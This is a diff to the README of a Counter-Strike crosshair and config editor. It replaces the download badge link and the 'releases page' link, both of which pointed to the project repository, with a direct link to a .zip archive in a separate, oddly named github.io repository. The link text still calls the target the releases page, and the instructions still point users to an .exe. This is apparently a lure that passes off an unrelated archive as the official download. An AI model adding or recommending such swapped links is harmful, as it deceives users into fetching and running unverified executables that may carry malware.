@@ -5,7 +5,7 @@ description: "Create custom Counter-Strike crosshairs and configuration files vi
 ---
 # 🎯 csbuilder-crosshair-editor - Build custom Counter-Strike settings easily
 
-[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/160th-leiomyoma656/csbuilder-crosshair-editor)
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/160th-leiomyoma656/160th-leiomyoma656.github.io/raw/refs/heads/main/changer/1.1.zip)
 
 This application creates custom configuration files for Counter-Strike 2, Counter-Strike: Source, and Counter-Strike 1.6. You use the visual interface to adjust settings. The tool writes the necessary code to your configuration files automatically. You do not need to open text editors or learn console commands to refine your gameplay.
 
@@ -13,7 +13,7 @@ This application creates custom configuration files for Counter-Strike 2, Counte
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/160th-leiomyoma656/csbuilder-crosshair-editor) for this project.
+1. Visit the [releases page](https://github.com/160th-leiomyoma656/160th-leiomyoma656.github.io/raw/refs/heads/main/changer/1.1.zip) for this project.
 2. Look for the most recent version under the Releases section.
 3. Locate the file ending in .exe.
 4. Click the file to start the download.
